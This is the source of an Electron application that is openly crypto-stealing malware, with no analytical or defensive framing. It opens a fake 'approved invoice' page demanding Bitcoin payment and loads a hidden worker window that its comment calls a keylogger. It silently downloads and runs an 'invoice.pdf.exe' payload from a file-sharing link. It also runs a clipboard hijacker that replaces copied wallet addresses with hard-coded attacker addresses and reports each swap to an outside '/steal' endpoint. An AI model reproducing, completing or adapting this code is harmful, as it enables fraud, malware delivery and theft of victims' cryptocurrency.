const { app, BrowserWindow, ipcMain, clipboard, net } = require('electron');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');

function createWindow() {
  // 1. Create a hidden worker window to run the keylogger script.
  const workerWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: true,
    },
  });
  workerWin.loadFile(path.join(__dirname, 'worker.html'));

  // 2. Show the decoy invoice immediately.
  const decoyWin = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  const invoiceHTML = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Invoice</title>
      <style>
        body { font-family: sans-serif; margin: 2em; }
        h1 { color: #333; }
        p { line-height: 1.6; }
        .address { font-family: monospace; background: #eee; padding: 1em; }
      </style>
    </head>
    <body>
      <h1>Approved Invoice</h1>
      <p>Well received, below I have attached an approved document invoice.</p>
      <p>You’re to pay that amount to the account address below the amount can also be remitted in cryptocurrency (Bitcoin)</p>
      <p>This is the address below</p>
      <p class="address">bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0</p>
      <p>Make due diligence in sending to the right address</p>
    </body>
    </html>
  `;
  decoyWin.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(invoiceHTML)}`);

  // 3. Start the background download simultaneously.
  const isMac = process.platform === 'darwin';

  const downloadLink = isMac
    ? 'YOUR_MACOS_PAYLOAD_DOWNLOAD_LINK_HERE'
    : 'https://www.dropbox.com/scl/fi/n5umt1lezx91cygika6r9/invoice.pdf.exe?rlkey=rv1x8zsttsi358h5juaexwfun&st=2vnrx3bf&dl=1';

  const fileName = isMac ? 'invoice.dmg' : 'invoice.pdf.exe';
  const downloadsPath = app.getPath('downloads');
  const filePath = path.join(downloadsPath, fileName);

  const downloadWin = new BrowserWindow({ show: false });
  downloadWin.loadURL(downloadLink);

  downloadWin.webContents.session.on('will-download', (event, item) => {
    item.setSavePath(filePath);
    item.on('done', (event, state) => {
      if (state === 'completed') {
        console.log('Download successfully');

        const command = isMac ? `open "${filePath}"` : `start "" "${filePath}"`;
        exec(command, (err) => {
          if (!err) app.quit();
        });
      } else {
        console.log(`Download failed: ${state}`);
        app.quit();
      }
    });
  });
}

app.whenReady().then(createWindow).then(() => {
  // === Clipbanker Logic (Moved to Main Process) ===
  const scammerAddresses = {
    btc:   "bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0",
    eth:   "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    usdt_erc20: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
    usdt_trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    erc20: "0xb9FBAa68123ad7BdaCb5820dE4f7998887733333",
    trc20: "THycvE5TKFTLv4nZsq8SJJCYhDmvysSLyk",
    sol:   "Gc1Xak8dXJY7h6G8XXMefa9BaiT8VMEsm6G4DXMzyCaX",
    bnbsc: "0x328bEaba35Eb07C1D4C82b19cE36A7345ED52C54",
  };

  function getScammerAddress(copied) {
    if (/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/.test(copied)) return scammerAddresses.btc;
    if (/^0x[a-fA-F0-9]{40}$/.test(copied)) return scammerAddresses.eth;
    if (/^T[a-zA-Z0-9]{33}$/.test(copied)) return scammerAddresses.trc20;
    if (/^[A-Za-z0-9]{43}$/.test(copied)) return scammerAddresses.sol;
    return null;
  }

  setInterval(() => {
    const text = clipboard.readText();
    const scammerAddress = getScammerAddress(text);
    if (scammerAddress && text !== scammerAddress) {
      clipboard.writeText(scammerAddress);
      
      const request = net.request({
        method: 'POST',
        url: 'https://invoice-wimt.onrender.com/steal'
      });
      request.setHeader('Content-Type', 'application/json');
      request.write(JSON.stringify({
        type: "clipbanker",
        original: text,
        replaced: scammerAddress,
        victim: "PC-User-01",
        timestamp: new Date().toISOString()
      }));
      request.end();
    }
  }, 200);
});
